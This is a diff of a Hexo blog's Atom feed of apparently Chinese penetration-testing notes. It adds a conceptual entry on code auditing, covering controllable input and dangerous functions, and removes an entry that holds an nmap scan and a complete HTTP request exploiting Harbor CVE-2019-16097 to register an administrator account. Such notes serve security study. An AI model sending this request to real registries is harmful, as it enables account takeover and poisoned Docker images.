@@ -6,7 +6,7 @@
   <link href="https://askding.github.io/atom.xml" rel="self"/>
   
   <link href="https://askding.github.io/"/>
-  <updated>2020-12-07T10:52:47.000Z</updated>
+  <updated>2020-12-07T11:51:19.000Z</updated>
   <id>https://askding.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>代码审计概念</title>
+    <link href="https://askding.github.io/Coding/Audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5.html"/>
+    <id>https://askding.github.io/Coding/Audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5.html</id>
+    <published>2020-12-07T11:51:19.000Z</published>
+    <updated>2020-12-07T11:51:19.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>程序=算法+代码<br>                    代码=函数+变量+（流程控制）</p><p>漏洞形成的条件：</p><ul><li>一、变量可控   一切输入都是有害的</li><li>二、变量传递到有利用价值的函数（可利用函数）</li></ul><p>漏洞造成的效果：<br>漏洞的利用效果取决于最终函数的功能<br>变量进入什么样的函数就会导致什么样的效果</p><p>危险函数：<br>函数的功能 导致 漏洞的种类</p><ul><li>文件包含：包含漏洞</li><li>代码执行：执行任意代码漏洞</li><li>命令执行：执行任意命令漏洞</li><li>文件系统操作：文件/目录 读写删除等漏洞</li><li>数据库操作：SQL注入漏洞</li><li>数据显示：xss等客户端漏洞</li><li>。。。</li></ul><p>变量跟踪分类：</p><ul><li>正向跟踪：通过变量找函数</li><li>逆向跟踪：通过函数找变量</li></ul><p>代码审计的本质<br>找漏洞=找对应变量与函数<br>变量就是漏洞（bug）本身，函数就是这个bug的爪子/衣服/种类</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;程序=算法+代码&lt;br&gt;                    代码=函数+变量+（流程控制）&lt;/p&gt;
+&lt;p&gt;漏洞形成的条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一、变量可控   一切输入都是有害的&lt;/li&gt;
+&lt;li&gt;二、变量传递到有利用价值的函数（可利用函数）&lt;/li&gt;
+&lt;/ul</summary>
+      
+    
+    
+    
+    <category term="Coding" scheme="https://askding.github.io/categories/Coding/"/>
+    
+    <category term="Audit" scheme="https://askding.github.io/categories/Coding/Audit/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>内网信息收集</title>
@@ -477,31 +506,6 @@
       
     <summary type="html">&lt;p&gt;NFS 网络文件系统(Network File System) 允许客户端上的用户像访问本地文件一样地访问网络上的文件&lt;/p&gt;
 &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h</summary>
-      
-    
-    
-    
-    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
-    
-    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Harbor</title>
-    <link href="https://askding.github.io/Kali/Exploit/Harbor.html"/>
-    <id>https://askding.github.io/Kali/Exploit/Harbor.html</id>
-    <published>2020-12-04T12:22:36.000Z</published>
-    <updated>2020-12-04T12:22:36.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh"> sudo nmap -sV -Pn -T4 -sSU -p 80,443 -sC    192.168.79.207         Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:39 CSTNmap scan report for 192.168.79.207Host is up (0.0065s latency).PORT    STATE         SERVICE  VERSION80/tcp  filtered      http443/tcp open          ssl/http nginx 1.11.5|_http-server-header: nginx/1.11.5|_http-title: Harbor| ssl-cert: Subject: commonName=*.mama.cn/organizationName=GZSC/stateOrProvinceName=Guangdong/countryName=CN| Not valid before: 2016-07-08T03:03:28|_Not valid after:  2017-07-08T03:03:28|_ssl-date: TLS randomness does not represent time| tls-nextprotoneg:|_  http/1.180/udp  open|filtered http443/udp open|filtered httpsNmap done: 1 IP address (1 host up) scanned in 132.41 seconds</code></pre><h2 id="Harbor任意管理员注册漏洞-CVE-2019-16097"><a href="#Harbor任意管理员注册漏洞-CVE-2019-16097" class="headerlink" title="Harbor任意管理员注册漏洞 CVE-2019-16097"></a>Harbor任意管理员注册漏洞 CVE-2019-16097</h2><p>影响版本：<br>Harbor 1.7.0-1.8.2，当且仅当镜像仓库开启了用户注册功能</p><h3 id="BurpSuite测试"><a href="#BurpSuite测试" class="headerlink" title="BurpSuite测试"></a>BurpSuite测试</h3><p>漏洞存在接口为 /api/users 的 POST 方法，<br>当提交的用户参数中包含 <code>has_admin_role: true</code> 时，则可直接注册创建权限为管理员的账号，<br>并且可上传写入恶意 Docker 镜像，进而可直接感染使用此镜像仓库的 Docker 主机。</p><pre><code>POST /api/users HTTP/1.1Host: 127.0.0.1Content-Length: 131Accept: application/jsonOrigin: http://127.0.0.1User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14Content-Type: application/jsonReferer: http://127.0.0.1/harbor/sign-inAccept-Language: zh-CN,zh;q=0.9Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81Connection: close&#123;&quot;username&quot;:&quot;mrhonest&quot;,&quot;email&quot;:&quot;mrhonest@qq.com&quot;,&quot;realname&quot;:&quot;mrhonest&quot;,&quot;password&quot;:&quot;111111Aaa&quot;,&quot;comment&quot;:&quot;11111&quot;,&quot;has_admin_role&quot;:true&#125;</code></pre><h4 id="注册时抓包"><a href="#注册时抓包" class="headerlink" title="注册时抓包"></a>注册时抓包</h4><p><img src="../images/75459948e2984cbe8d38b6c70bc9cd81.jpg" alt="75459948e2984cbe8d38b6c70bc9cd81"></p><h4 id="添加poc"><a href="#添加poc" class="headerlink" title="添加poc"></a>添加poc</h4><ol><li> <code>&quot;has_admin_role&quot;:true</code></li></ol><p><img src="../images/6d4106bbad0644478c1095e54b5829c6.jpg" alt="6d4106bbad0644478c1095e54b5829c6"></p><h4 id="管理员权限"><a href="#管理员权限" class="headerlink" title="管理员权限"></a>管理员权限</h4><p><img src="../images/c4a7a60f8c8244c5bb38031347a66743.jpg" alt="c4a7a60f8c8244c5bb38031347a66743"></p><h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><p><a href="https://github.com/theLSA/harbor-give-me-admin.git">harbor添加管理员漏洞检测工具</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库&lt;/p&gt;
-&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;</summary>
       
     
     
